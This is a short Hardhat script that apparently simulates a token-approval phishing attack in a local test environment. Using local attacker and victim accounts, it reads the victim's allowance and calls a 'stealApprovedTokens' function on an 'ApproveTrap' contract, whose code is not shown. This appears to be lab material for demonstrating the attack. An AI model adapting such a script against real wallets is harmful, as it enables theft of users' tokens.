const hre = require("hardhat");

async function main() {
    const [attacker, victim] = await hre.ethers.getSigners();
    console.log("[+] Phishing Attack initiated");

    const deployments = require("../deployments.json");
    const trap = await hre.ethers.getContractAt("ApproveTrap", deployments.ApproveTrap);
    const direct = await hre.ethers.getContractAt("DirectSteal", deployments.DirectSteal);

    console.log("[i] Simulating victim approval...");
    const allowance = await trap.checkAllowance(attacker.address, victim.address);
    console.log("    Victim allowance:", allowance.toString());

    console.log("[i] Executing token steal...");
    try {
        const tx = await trap.stealApprovedTokens(attacker.address, victim.address);
        await tx.wait();
        console.log("[✓] Tokens stolen via approval trap");
    } catch(e) {
        console.log("[!] No approval found (expected in test env)");
    }
}

main().catch(console.error);
